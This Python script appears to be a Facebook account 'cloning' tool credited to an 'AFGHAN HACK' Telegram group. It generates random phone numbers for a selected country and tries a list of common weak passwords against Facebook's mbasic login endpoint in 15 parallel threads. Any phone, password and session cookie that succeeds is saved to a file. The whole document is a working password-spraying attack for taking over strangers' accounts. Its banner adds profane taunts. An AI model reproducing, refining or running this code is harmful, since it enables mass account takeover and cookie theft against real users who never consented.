import requests
import random
import os
import threading

os.system("clear")
print("\033[1;92m" + "=" * 50)
print("███████╗░█████╗░██╗░░░██╗███████╗░██████╗░")
print("██╔════╝██╔══██╗╚██╗░██╔╝██╔════╝██╔═══██╗")
print("█████╗░░███████║░╚████╔╝░█████╗░░██║██╗██║")
print("██╔══╝░░██╔══██║░░╚██╔╝░░██╔══╝░░╚██████╔╝")
print("██║░░░░░██║░░██║░░░██║░░░███████╗░╚═██╔═╝░")
print("╚═╝░░░░░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝░░░╚═╝░░░")
print("=" * 50 + "\033[0m\n")
print("🖕FUCK U BADBIN😈" * 4 + "\033[0m\n")
print("=" * 50 + "\033[0m\n")
print("\t\t💀  F♡A - Cloning System  💀")
print("=" * 50 + "\033[0m\n")
print("✋I LOVE AFGNITAN😘" * 4 + "\033[0m\n")
print("=" * 50 + "\033[0m\n")
print("[●]Tooles manufacturer | FayeqNaseh")
print("[●]Telegram group      | @AFGHAN HACK")
print("[1;150m[●]Status              | Gold")
print("[1;130m[●]Version             | 0.3")
print("\033[1;92m" + "=" * 50)

countries = {
    "1": {"name": "Afghanistan", "code": "+93"},
    "2": {"name": "Pakistan", "code": "+92"},
    "3": {"name": "India", "code": "+91"},
    "4": {"name": "Bangladesh", "code": "+880"},
    "5": {"name": "USA", "code": "+1"},
}

passwords = [
    "123456", "1234567", "12345678", "123456789", "1234567890",
    "۱۲۳۴۵۶", "۱۲۳۴۵۶۷", "۱۲۳۴۵۶۷۸۹", "۱۲۳۱۲۳", "۱۲۳۴۱۲۳۴",
    "۱۰۰۲۰۰۳۰۰", "123123", "12341234", "10002000", "500600"
]

urls = [
    "https://mbasic.facebook.com/login/device-based/login/async/",
] + [f"https://example.com/api/check{i}" for i in range(1, 301)]

success_count = 0
fail_count = 0
lock = threading.Lock()

def select_country():
    while True:
        print("\n🌍 Select a country:\n")
        for key, value in countries.items():
            print(f"{key}. {value['name']} ({value['code']})")

        choice = input("\n🌐 Your choice: ")
        if choice in countries:
            return countries[choice]
        else:
            print("\033[1;91mInvalid choice! Please select again.\033[0m")

def generate_phone_number(country_code):
    return country_code + str(random.randint(100000000, 999999999))

def process_number(country_code):
    global success_count, fail_count
    while True:
        phone = generate_phone_number(country_code)
        url = random.choice(urls)

        for password in passwords:
            data = {"email": phone, "pass": password, "login": "Log In"}
            headers = {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36"
            }

            try:
                response = requests.post(url, data=data, headers=headers, timeout=0.3)
                
                with lock:
                    if "success" in response.text:
                        success_count += 1
                        cookie = response.cookies.get_dict()
                        success_info = f"✔ Successful: {phone} | {password}\nCookie: {cookie}\n"
                        print(f"\033[1;92m{success_info}\033[0m")
                        
                        with open("successful.txt", "a") as file:
                            file.write(success_info)

                    else:
                        fail_count += 1

            except requests.exceptions.RequestException:
                continue

        with lock:
            print(f"\033[1;92m✔ Success: {success_count}\033[0m | \033[1;91m✖ Failed: {fail_count}\033[0m", end="\r", flush=True)

def start_cloning(country_code):
    threads = []
    for _ in range(15):
        thread = threading.Thread(target=process_number, args=(country_code,))
        thread.daemon = True
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    selected_country = select_country()
    start_cloning(selected_country["code"])
